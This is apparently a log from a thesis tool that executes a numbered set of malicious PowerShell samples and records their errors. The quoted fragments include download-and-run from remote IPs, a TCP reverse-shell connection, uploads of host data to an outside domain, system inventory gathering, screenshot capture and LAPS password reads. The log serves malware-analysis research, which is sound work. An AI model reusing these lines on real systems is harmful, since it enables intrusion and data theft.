+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 282 | ←[0m . HandleRef = ←[36;1mNew-Object System.Runtime.InteropServices.HandleRef($tmpP←[0m .←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot convert argument "1", with value: "", for "HandleRef" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."←[0m
+←[31;1mInvalidArgument: ←[0m
+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 285 | ←[0m         ←[36;1mWrite-Output $GetProcAddress.Invoke($null, @([System.Runtime.←[0m .←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot convert null to type "System.Runtime.InteropServices.HandleRef".←[0m
+Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."
+At line:197 char:9
++         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : AmbiguousMatchException
+
+You cannot call a method on a null-valued expression.
+At line:203 char:9
++         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+No connection could be made because the target machine actively refused it 192.168.1.100:443
+At line:502 char:13
++             Throw "$($Error[0].Exception.InnerException.InnerExceptio ...
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (No connection c...2.168.1.100:443:String) [], RuntimeException
+    + FullyQualifiedErrorId : No connection could be made because the target machine actively refused it 192.168.1.100
+   :443
+
+Executed {11}
+Executing {110}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\110.ps1
+Executed {110}
+Executing {112}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\112.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\112.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m ←[36;1m$indexContent = [char[]]($webClient.DownloadString("http://104.233.10←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadString" with "1" argument(s): "No connection could be made because the target machine←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mactively refused it. [::ffff:104.233.102.23]:8080 (104.233.102.23:8080)"←[0m
+←[31;1mInvoke-Expression: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\112.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m Invoke-Expression ←[36;1m($indexContent -join '')←[0m;←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                   ~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot bind argument to parameter 'Command' because it is an empty string.←[0m
+Executed {112}
+Executing {113}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\113.ps1
+Executed {113}
+Executing {114}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\114.ps1
+Executed {114}
+Executing {115}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\115.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\115.ps1:26←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  26 | ←[0m . zkfcJXnTcTGung = ("AgICAgICAgICAgICAgIGlmIChwKaaSova(pKaaaJEJaJaiJi)"←[36;1m←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                                                        ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mMissing closing ')' in expression.←[0m
+Executed {115}
+Executing {117}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1
+←[31;1mNew-Object: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m $client = ←[36;1mNew-Object System.Net.Sockets.TcpClient ($addr, $port)←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mrefused it. [::ffff:45.82.71.119]:443"←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1:4←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   4 | ←[0m ←[36;1m$stream = $client.GetStream()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mNew-Object: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m $buffer = ←[36;1mNew-Object System.Byte[] $client.ReceiveBufferSize←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mA constructor was not found. Cannot find an appropriate constructor for type System.Byte[].←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1:19←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  19 | ←[0m     ←[36;1m$stream.Close()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\117.ps1:21←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  21 | ←[0m ←[36;1m$client.Close()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+Executed {117}
+Executing {118}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\118.ps1
+Executed {118}
+Executing {119}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\119.ps1
+Executed {119}
+Executing {12}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\12.ps1
+Executed {12}
+Executing {120}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\120.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\120.ps1:22←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  22 | ←[0m . ]::Unicode.GetBytes((Get-Content -Path $encFile -Raw -Encoding UTF8))←[36;1m←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                                                        ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mMissing ')' in method call.←[0m
+Executed {120}
+Executing {121}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\121.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\121.ps1:62←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  62 | ←[0m . ]::ToInt64($_.properties['ms-MCS-AdmPwdExpirationTime'],10))←[36;1m}←[0melse{$Cu .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                                               ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mMissing closing ')' in subexpression.←[0m
+Executed {121}
+Executing {122}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\122.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\122.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m     ←[36;1mConvertFromStringData @h4g←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe command 'ConvertFromStringData' is not allowed in restricted language mode or a Data section.←[0m
+Executed {122}
+Executing {13}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\13.ps1
+Executed {13}
+Executing {14}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\14.ps1
+Executed {14}
+Executing {15}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\15.ps1
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\15.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m $email = (←[36;1mGet-WmiObject←[0m  -Class 'Win32_ComputerSystem' | Select-Objec .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m           ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mInvoke-WebRequest: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\15.ps1:35←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  35 | ←[0m ←[36;1mInvoke-WebRequest -Uri 'https://file.onli-ne.com/track/index.php' -Me←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mNo such host is known.←[0m
+←[31;1mInvoke-WebRequest: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\15.ps1:36←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  36 | ←[0m ←[36;1mInvoke-WebRequest -Uri "https://file.onli-ne.com/cmd/sysfiles/$env:CO←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mNo such host is known.←[0m
+Executed {15}
+Executing {16}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\16.ps1
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\16.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m $software = ←[36;1mGet-WmiObject←[0m -Class Win32_Product | Select-Object Name,  .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m             ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\16.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m $drivers = ←[36;1mGet-WmiObject←[0m -Class Win32_PnPSignedDriver | Select-Object .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m            ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\16.ps1:9←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   9 | ←[0m $systemInfo = ←[36;1mGet-WmiObject←[0m -Class Win32_ComputerSystem | Select-Obje .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-ChildItem: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\16.ps1:11←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  11 | ←[0m $files = ←[36;1mGet-ChildItem $rootDirectory -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mAccess to the path 'C:\Program Files\Windows Defender Advanced Threat Protection\Classification\Configuration'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mis denied.←[0m
+Executed {16}
+Executing {17}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\17.ps1
+Executed {17}
+Executing {18}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\18.ps1
+←[31;1mwget: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\18.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mwget←[0m -URI http://104.248.91.138:8080/SysHost.exe -outfile ~\AppData\R .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'wget' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mStart-Process: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\18.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m ←[36;1mStart-Process -FilePath "~\AppData\Roaming\Microsoft\Crypto\SysHost.e←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThis command cannot be run due to the error: An error occurred trying to start process←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1m'~\AppData\Roaming\Microsoft\Crypto\SysHost.exe' with working directory 'C:\Windows\System32'. The system cannot←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mfind the file specified.←[0m
+Executed {18}
+Executing {19}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mRemove-Item -path C:\Windows\Temp\5db65c7.ps1←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Windows\Temp\5db65c7.ps1' because it does not exist.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:80←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  80 | ←[0m ←[36;1mGet-WmiObject←[0m -class win32_computersystem | Out-File $source\summary. .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:81←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  81 | ←[0m ←[36;1mGet-WmiObject←[0m Win32_BIOS -computerName localhost | Out-File $source\b .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:82←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  82 | ←[0m ←[36;1mGet-WmiObject←[0m -Class "win32_PhysicalMemory" -namespace "root\CIMV2" | .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:83←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  83 | ←[0m @(←[36;1mGet-WmiObject←[0m -class win32_processor | Select Caption, Description, .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mgwmi: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:84←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  84 | ←[0m ←[36;1mgwmi←[0m Win32_NetworkAdapterConfiguration | Where { $_.IPAddress } | Sel .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'gwmi' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mgwmi: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:85←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  85 | ←[0m ←[36;1mgwmi←[0m Win32_NetworkAdapterConfiguration | Out-File $source\NetworkAdap .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'gwmi' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mget-WmiObject: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:86←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  86 | ←[0m ←[36;1mget-WmiObject←[0m win32_logicaldisk | Out-File $source\disk.txt;←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'get-WmiObject' is not recognized as a name of a cmdlet, function, script file, or executable program.←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGet-Service: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:96←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  96 | ←[0m ←[36;1mGet-Service←[0m | Out-File $source\service.txt;←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mService 'McpManagementService (McpManagementService)' cannot be queried due to the following error: ←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:61←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  61 | ←[0m             ←[36;1m[Windows.Forms.Sendkeys]←[0m::SendWait("{PrtSc}")←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m             ~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mUnable to find type [Windows.Forms.Sendkeys].←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\19.ps1:65←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
